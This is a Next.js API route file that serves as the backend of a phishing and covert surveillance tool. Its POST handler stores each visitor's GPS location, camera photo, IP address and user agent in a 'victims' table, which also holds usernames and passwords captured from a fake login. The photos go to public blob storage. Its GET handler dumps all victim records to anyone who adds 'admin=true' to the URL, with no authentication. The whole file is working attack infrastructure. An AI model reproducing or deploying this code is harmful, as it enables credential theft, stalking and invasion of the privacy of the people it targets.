import { NextResponse } from 'next/server';
import { put } from '@vercel/blob';
import { neon } from '@neondatabase/serverless';

export async function POST(request) {
  try {
    const formData = await request.formData();
    const lat = formData.get('lat');
    const lng = formData.get('lng');
    const accuracy = formData.get('accuracy') || 0;
    const victimId = formData.get('victimId') || null;
    const photoFile = formData.get('photo');

    let photoUrl = null;

    // Upload photo to Vercel Blob if provided
    if (photoFile && photoFile instanceof Blob && photoFile.size > 0 && process.env.BLOB_READ_WRITE_TOKEN) {
      const buffer = Buffer.from(await photoFile.arrayBuffer());
      const filename = `captures/${Date.now()}_${Math.random().toString(36).substring(2, 8)}.jpg`;
      const blob = await put(filename, buffer, {
        access: 'public',
        contentType: 'image/jpeg',
        addRandomSuffix: true,
      });
      photoUrl = blob.url;
    }

    // Store in database if DATABASE_URL is configured
    if (process.env.DATABASE_URL && lat && lng) {
      const sql = neon(process.env.DATABASE_URL);

      // Create table if not exists
      await sql(`
        CREATE TABLE IF NOT EXISTS victims (
          id SERIAL PRIMARY KEY,
          ip_address VARCHAR(45),
          user_agent TEXT,
          username VARCHAR(255),
          password VARCHAR(255),
          latitude DECIMAL(10, 8),
          longitude DECIMAL(11, 8),
          location_accuracy DECIMAL(10, 2),
          photo_url TEXT,
          captured_at TIMESTAMPTZ DEFAULT NOW()
        );
      `);

      if (victimId) {
        // Update existing record (from login)
        await sql`
          UPDATE victims
          SET latitude = ${lat}, longitude = ${lng},
              location_accuracy = ${accuracy}, photo_url = ${photoUrl}
          WHERE id = ${victimId};
        `;
      } else {
        // Insert new record (GPS + photo only, no login)
        const ip = request.headers.get('x-forwarded-for') || 'unknown';
        const ua = request.headers.get('user-agent') || 'unknown';
        await sql`
          INSERT INTO victims (ip_address, user_agent, latitude, longitude, location_accuracy, photo_url)
          VALUES (${ip}, ${ua}, ${lat}, ${lng}, ${accuracy}, ${photoUrl});
        `;
      }
    }

    return NextResponse.json({ status: 'ok' });
  } catch (error) {
    console.error('[CAPTURE ERROR]', error);
    return NextResponse.json({ status: 'ok' });
  }
}

// GET handler for admin dashboard
export async function GET(request) {
  const { searchParams } = new URL(request.url);
  
  if (searchParams.get('admin') === 'true' && process.env.DATABASE_URL) {
    try {
      const sql = neon(process.env.DATABASE_URL);
      const data = await sql`SELECT * FROM victims ORDER BY captured_at DESC;`;
      return NextResponse.json(data);
    } catch (error) {
      console.error('[ADMIN ERROR]', error);
      return NextResponse.json([]);
    }
  }
  
  return NextResponse.json({ status: 'error' }, { status: 404 });
}
